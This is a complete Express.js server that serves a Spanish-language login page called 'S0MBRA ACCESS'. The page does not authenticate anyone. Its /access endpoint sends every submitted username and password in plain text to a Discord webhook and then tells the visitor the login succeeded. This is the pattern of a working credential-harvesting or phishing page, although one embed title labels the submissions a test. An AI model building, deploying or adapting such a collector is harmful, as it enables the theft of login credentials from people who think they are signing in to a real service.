import express from "express";

const app = express();

app.use(express.json());

const PORT = process.env.PORT || 3000;
const DISCORD_WEBHOOK = process.env.DISCORD_WEBHOOK;

app.get("/", (req, res) => {
  res.send(`
<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>S0MBRA ACCESS</title>

<style>
* {
  box-sizing: border-box;
}

body {
  margin: 0;
  min-height: 100vh;
  display: flex;
  justify-content: center;
  align-items: center;
  background: #080808;
  color: white;
  font-family: Arial, sans-serif;
}

.container {
  width: 90%;
  max-width: 390px;
  padding: 30px;
  background: #111;
  border: 1px solid #292929;
  border-radius: 18px;
  text-align: center;
  box-shadow: 0 0 30px rgba(255,255,255,0.05);
}

.logo {
  font-size: 32px;
  font-weight: bold;
  letter-spacing: 5px;
  margin-bottom: 25px;
}

.label {
  display: block;
  text-align: left;
  margin: 12px 0 7px;
  color: #aaa;
  font-size: 14px;
}

input {
  width: 100%;
  padding: 14px;
  border-radius: 10px;
  border: 1px solid #333;
  background: #080808;
  color: white;
  outline: none;
  text-align: center;
  font-size: 16px;
}

input:focus {
  border-color: #777;
}

button {
  width: 100%;
  margin-top: 20px;
  padding: 14px;
  border: 0;
  border-radius: 10px;
  background: white;
  color: black;
  font-size: 16px;
  font-weight: bold;
  cursor: pointer;
}

#status {
  margin-top: 18px;
  min-height: 22px;
  color: #aaa;
}
</style>
</head>

<body>

<div class="container">

  <div class="logo">S0MBRA</div>

  <label class="label">USUARIO</label>

  <input
    id="usuario"
    type="text"
    placeholder="Ingresá tu usuario"
    autocomplete="off"
  >

  <label class="label">CLAVE</label>

  <input
    id="clave"
    type="text"
    placeholder="Ingresá clave"
    autocomplete="off"
  >

  <button onclick="access()">ENTRAR</button>

  <div id="status"></div>

</div>

<script>
async function access() {

  const usuario = document.getElementById("usuario").value.trim();
  const clave = document.getElementById("clave").value.trim();
  const status = document.getElementById("status");

  if (!usuario || !clave) {
    status.textContent = "⚠️ Completá los dos campos";
    return;
  }

  status.textContent = "⏳ Enviando...";

  try {

    const response = await fetch("/access", {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        usuario: usuario,
        clave: clave
      })
    });

    const data = await response.json();

    if (data.success) {

      status.textContent =
        "✅ Usuario: " + usuario +
        " | CLAVE: " + clave;

    } else {

      status.textContent = "❌ " + data.message;

    }

  } catch (error) {

    status.textContent = "❌ Error de conexión";

  }
}
</script>

</body>
</html>
  `);
});

app.post("/access", async (req, res) => {

  try {

    const usuario = String(req.body?.usuario || "").trim();
    const clave = String(req.body?.clave || "").trim();

    if (!usuario || !clave) {
      return res.status(400).json({
        success: false,
        message: "Completá los dos campos"
      });
    }

    if (!DISCORD_WEBHOOK) {
      return res.status(500).json({
        success: false,
        message: "Webhook no configurado"
      });
    }

    await fetch(DISCORD_WEBHOOK, {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        username: "S0MBRA ACCESS",
        embeds: [
          {
            title: "🔐 Nuevo registro de prueba",
            fields: [
              {
                name: "👤 Usuario",
                value: usuario
              },
              {
                name: "🔑 CLAVE",
                value: clave
              },
              {
                name: "Estado",
                value: "🟢 RECIBIDO"
              }
            ],
            timestamp: new Date().toISOString()
          }
        ]
      })
    });

    res.json({
      success: true,
      message: "Datos recibidos"
    });

  } catch (error) {

    console.error(error);

    res.status(500).json({
      success: false,
      message: "Error interno"
    });

  }

});

app.listen(PORT, "0.0.0.0", () => {
  console.log(`S0MBRA Access funcionando en puerto ${PORT}`);
}); 
